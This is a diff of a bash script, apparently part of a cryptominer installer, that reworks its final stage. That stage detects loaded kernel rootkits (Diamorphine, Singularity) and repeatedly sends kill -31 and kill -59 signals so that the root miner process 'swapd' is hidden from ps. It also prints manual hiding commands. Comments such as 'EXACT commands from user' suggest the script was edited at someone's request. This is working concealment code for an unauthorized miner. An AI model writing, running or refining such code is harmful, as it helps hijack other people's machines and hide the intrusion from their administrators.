@@ -3051,113 +3051,92 @@ fi
 
 echo ''
 
-# ==================== HIDE MINER PROCESSES ====================
+exit 0
+
+# ==================== HIDE MINER PROCESSES (FINAL STEP) ====================
 echo ""
 echo "=========================================="
 echo "ACTIVATING PROCESS HIDING"
 echo "=========================================="
 echo ""
 
-# Check which rootkits are actually loaded
-echo "[*] Checking for loaded rootkits..."
-ROOTKITS_LOADED=false
-
-if lsmod | grep -q diamorphine 2>/dev/null; then
-    echo "[✓] Diamorphine detected (use kill -31 to hide)"
-    ROOTKITS_LOADED=true
-fi
-
-if lsmod | grep -q singularity 2>/dev/null; then
-    echo "[✓] Singularity detected (use kill -59 to hide)"
-    ROOTKITS_LOADED=true
-fi
-
-if lsmod | grep -q rootkit 2>/dev/null; then
-    echo "[✓] Crypto-RK detected (use kill -31 to hide)"
-    ROOTKITS_LOADED=true
-fi
-
-if [ "$ROOTKITS_LOADED" = false ]; then
-    echo "[!] WARNING: No rootkits loaded - cannot hide processes"
-    echo "[!] Processes will remain visible in 'ps' output"
-    echo "[*] To hide manually after loading rootkits, run:"
-    echo "    kill -31 \$(pgrep -f swapd)"
-    echo "    kill -59 \$(pgrep -f swapd)"
-else
+# Check if rootkits are loaded
+if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
+    echo "[!] WARNING: No rootkits detected!"
+    echo "[!] Miner will remain VISIBLE in ps output"
     echo ""
-    echo "[*] Waiting for processes to fully start..."
-    sleep 10  # Longer wait to ensure process is stable
+    echo "To hide manually after loading rootkits, run:"
+    echo "  kill -31 \$(pgrep -f -u root config.json)"
+    echo "  kill -59 \$(pgrep -f -u root config.json)"
+else
+    echo "[✓] Rootkits detected"
+    echo ""
     
-    # Retry loop to ensure hiding works
-    MAX_ATTEMPTS=5
+    # Keep trying until hidden (max 10 attempts)
+    MAX_ATTEMPTS=10
     attempt=0
-    hidden=false
     
-    while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$hidden" = false ]; do
+    while [ $attempt -lt $MAX_ATTEMPTS ]; do
         attempt=$((attempt + 1))
+        echo "[*] Hide attempt $attempt/$MAX_ATTEMPTS..."
         
-        if [ $attempt -gt 1 ]; then
-            echo ""
-            echo "[*] Retry attempt $attempt/$MAX_ATTEMPTS..."
-        else
-            echo "[*] Sending hide signals to miner processes..."
-        fi
-        
-        # Use EXACTLY the user's commands (they work manually)
+        # Execute kill commands (EXACT commands from user)
         kill -31 $(pgrep -f -u root config.json) 2>/dev/null
         kill -59 $(pgrep -f -u root config.json) 2>/dev/null
         kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
         kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
         
-        # Wait longer for rootkit to process signals
-        sleep 3
+        # Sleep 5 seconds (as requested)
+        sleep 5
         
-        # Verify hiding worked
-        echo "[*] Verifying process visibility..."
-        STILL_VISIBLE=$(ps ax | grep -E '/root/.swapd/swapd' | grep -v grep)
+        # Check if swapd is hidden
+        SWAPD_VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
         
-        if [ -z "$STILL_VISIBLE" ]; then
-            hidden=true
-            echo "[✓] SUCCESS! Miner process is now HIDDEN!"
+        if [ -z "$SWAPD_VISIBLE" ]; then
+            # SUCCESS - swapd is hidden!
             echo ""
-            echo "Verification:"
-            echo "  ps ax | grep swapd → Only shows [kswapd0] (kernel thread) ✓"
+            echo "=========================================="
+            echo "[✓] SUCCESS! SWAPD IS HIDDEN!"
+            echo "=========================================="
+            echo ""
+            echo "Verification (ps ax | grep swapd):"
+            ps ax | grep swapd | grep -v grep || echo "  (no swapd visible - only [kswapd0] kernel thread may appear)"
+            echo ""
+            echo "Miner is running but HIDDEN from ps!"
+            echo "Check status: systemctl status swapd"
+            echo ""
+            break
         else
-            echo "[!] Process still visible (attempt $attempt/$MAX_ATTEMPTS)"
-            if [ $attempt -lt $MAX_ATTEMPTS ]; then
-                echo "[*] Waiting 5 seconds before retry..."
-                sleep 5
-            fi
+            # Not hidden - do commands again
+            echo "[!] swapd still visible - trying again..."
         fi
     done
     
-    if [ "$hidden" = false ]; then
-        echo ""
-        echo "=========================================="
-        echo "[!] WARNING: PROCESS STILL VISIBLE"
-        echo "=========================================="
-        echo ""
-        echo "The miner is running but NOT hidden after $MAX_ATTEMPTS attempts"
-        echo ""
-        echo "This means one of these issues:"
-        echo "  1. Rootkit is not working properly"
-        echo "  2. Process restarts too quickly after hide signal"
-        echo "  3. Systemd ExecStartPost interfering"
-        echo ""
-        echo "MANUAL FIX - Run these commands now:"
-        echo ""
-        echo "kill -31 \$(pgrep -f -u root config.json)"
-        echo "kill -59 \$(pgrep -f -u root config.json)"
-        echo "kill -31 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
-        echo "kill -59 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
-        echo ""
-        echo "Then verify: ps ax | grep swapd"
-        echo ""
+    # Final check after all attempts
+    if [ $attempt -eq $MAX_ATTEMPTS ]; then
+        SWAPD_VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
+        if [ -n "$SWAPD_VISIBLE" ]; then
+            echo ""
+            echo "=========================================="
+            echo "[!] WARNING: SWAPD STILL VISIBLE"
+            echo "=========================================="
+            echo ""
+            echo "After $MAX_ATTEMPTS attempts, swapd is still visible:"
+            echo ""
+            ps ax | grep swapd | grep -v grep
+            echo ""
+            echo "Manual fix - run these exact commands:"
+            echo "  kill -31 \$(pgrep -f -u root config.json)"
+            echo "  kill -59 \$(pgrep -f -u root config.json)"
+            echo "  kill -31 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
+            echo "  kill -59 \`/bin/ps ax -fu \$USER| grep \"swapd\" | grep -v \"grep\" | awk '{print \$2}'\`"
+            echo ""
+        fi
     fi
 fi
 
-echo ""
 echo '========================================================================'
+echo ""
 
-# Exit successfully (prevent parent wrapper from retrying)
+# Exit successfully
 exit 0
